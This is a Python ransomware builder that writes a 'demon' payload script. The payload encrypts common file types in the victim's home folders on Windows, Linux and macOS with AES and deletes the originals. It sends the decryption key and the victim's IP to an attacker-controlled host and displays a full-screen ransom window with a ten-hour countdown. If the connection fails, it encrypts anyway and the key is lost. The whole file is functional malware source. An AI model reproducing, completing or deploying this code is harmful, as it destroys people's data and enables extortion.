import re

def create_demon(host, port, fullscreen, demo, ghost, msg, img_base64):
    demon = """#/usr/bin/env python3
import os, sys, socket, string, random, hashlib, getpass, platform, threading, datetime, time, PIL.Image, PIL.ImageTk, base64
from tkinter import *
from tkinter.ttk import *
from io import BytesIO

<import_random>
<import_aes>

class mainwindow(Tk):
    def __init__(self):
        Tk.__init__(self)
        self.title(string = "Tango Down!") # Set window title
        self.resizable(0,0) # Do not allow to be resized
        self.configure(background='black')
        self.overrideredirect(True)
        <fullscreen>

        photo_code = '''<img_base64>
'''
        photo = PIL.Image.open(BytesIO(base64.b64decode(photo_code)))
        resized = photo.resize((150,150), PIL.Image.ANTIALIAS)
        photo = PIL.ImageTk.PhotoImage(resized)

        label = Label(self, image=photo, background = 'black')
        label.image = photo # keep a reference!
        label.grid(row = 5, column = 0, rowspan = 2)
        label = Label(self, image=photo, background = 'black')
        label.image = photo # keep a reference!
        label.grid(row = 5, column = 3, rowspan = 2)

        message = '''<message>
'''
        Label(self, text = message, font='Helvetica 16 bold', foreground = 'white', background = 'red').grid(row = 0, column = 0, columnspan = 4)

        Label(self, text = '', font='Helvetica 18 bold', foreground='red', background = 'black').grid(row = 5, column = 2)
        Label(self, text = '', font='Helvetica 18 bold', foreground='red', background = 'black').grid(row = 6, column = 2)


        def start_thread():
            # Start timer as thread
            thread = threading.Thread(target=start_timer)
            thread.daemon = True
            thread.start()

        def start_timer():
            Label(self, text = 'TIME LEFT:', font='Helvetica 18 bold', foreground='red', background = 'black').grid(row = 5, column = 0, columnspan = 4)
            try:
                s = 36000 # 10 hours
                while s:
                    min, sec = divmod(s, 60)
                    time_left = '{:02d}:{:02d}'.format(min, sec)

                    Label(self, text = time_left, font='Helvetica 18 bold', foreground='red', background = 'black').grid(row = 6, column = 0, columnspan = 4)
                    time.sleep(1)
                    s -= 1
            except KeyboardInterrupt:
                print('Closed...')

        if platform == 'Windows':
            pass
        else:
            start_thread()

def getlocalip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))
    return s.getsockname()[0]

def gen_string(size=64, chars=string.ascii_uppercase + string.digits):
      return ''.join(random.choice(chars) for _ in range(size))

# Encryption
def pad(s):
    return s + b'\\0' * (AES.block_size - len(s) % AES.block_size)

def encrypt(message, key, key_size=256):
    message = pad(message)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(message)

def encrypt_file(file_name, key):
    with open(file_name, 'rb') as fo:
        plaintext = fo.read()
    enc = encrypt(plaintext, key)
    with open(file_name + ".DEMON", 'wb') as fo:
        fo.write(enc)


host = '<host>'
port = <port>

key = hashlib.md5(gen_string().encode('utf-8')).hexdigest()
key = key.encode('utf-8')

global platform
platform = platform.system()

# Encrypt file that endswith
ext = ['.txt',
    '.ppt','.pptx','.doc','.docx','.gif','.jpg','.png', '.ico', '.mp3','.ogg',
    '.csv','.xls','.exe','.pdf', '.ods','.odt','.kdbx','.kdb','.mp4','.flv','.ini',
    '.iso','.zip','.tar','.tar.gz','.rar']

def get_target():
    # Users home on Linux
    if platform == 'Linux':
        target = '/home/' + getpass.getuser() + '/'
        return target

    # Users home on Windows
    elif platform == 'Windows':
        target = 'C:\\\\Users\\\\' + getpass.getuser() + '\\\\'
        return target

    # Users home on MacOS
    elif platform == 'Darwin':
        target = '/Users/' + getpass.getuser() + '/'
        return target
    else:
        sys.exit(1) # Cannot find users home directory.

def start_encrypt(p, key):
    c = 0

    if platform == 'Windows':
        dirs = ['Downloads', 'Documents', 'Pictures', 'Music', 'Onedrive', 'Desktop']
    elif platform == 'Darwin':
        dirs = ['Downloads', 'Documents', 'Downloads', 'Pictures', 'Music']
    elif platform == 'Linux':
        dirs = ['Downloads', 'Documents', 'Desktop', 'Pictures']

    try:
        for x in dirs:
            if platform == 'Windows':
                target = p + x + '\\\\'
            else:
                target = p + x + '/'

            for path, subdirs, files in os.walk(target):
                for name in files:
                    for i in ext:
                        if name.endswith(i.lower()):
                            encrypt_file(os.path.join(path, name), key)
                            c +=1
                            os.remove(os.path.join(path, name))

        #os.remove(sys.argv[0]) # destroy encrypter when finished
    except Exception as e:
        pass # continue if error

def connector():
    server = socket.socket(socket.AF_INET)
    server.settimeout(1)

    try:
        # Send Key
        server.connect((host, port))
        msg = '%s$%s$%s' % (getlocalip(), platform, key)
        server.send(msg.encode('utf-8'))

        <encrypt>

        main = mainwindow()
        main.mainloop()

    except Exception as e:
        # Do not send key, encrypt anyway.
        <encrypt>
        main = mainwindow()
        main.mainloop()

try:
    connector()
except KeyboardInterrupt:
    sys.exit(0)

    """

    # Input settings by replacing it
    demon = demon.replace("<host>", host)
    demon = demon.replace('<port>', str(port))

    if fullscreen == 1:
        # Insert fullscreen code
        demon = demon.replace('<fullscreen>', 'self.geometry("{0}x{1}+0+0".format(self.winfo_screenwidth(), self.winfo_screenheight()))')
    elif fullscreen == 0:
        # Replace setting with empty string
        demon = demon.replace('<fullscreen>', '')

    if demo == 1:
        # Disable encrypting
        demon = demon.replace('<encrypt>', '#start_encrypt(get_target(), key)')
        demon = demon.replace('<import_random>', '')
        demon = demon.replace('<import_aes>', '')
    elif demo == 0:
        # Enable Encrypting
        demon = demon.replace('<encrypt>', 'start_encrypt(get_target(), key)')
        demon = demon.replace('<import_random>', 'from Crypto import Random')
        demon = demon.replace('<import_aes>', 'from Crypto.Cipher import AES')

    # Set message
    demon = demon.replace('<message>', msg)

    # Set image base64 code
    demon = demon.replace('<img_base64>', img_base64)

    with open('./payload.py', 'w') as f:
        f.write(demon)
        f.close()
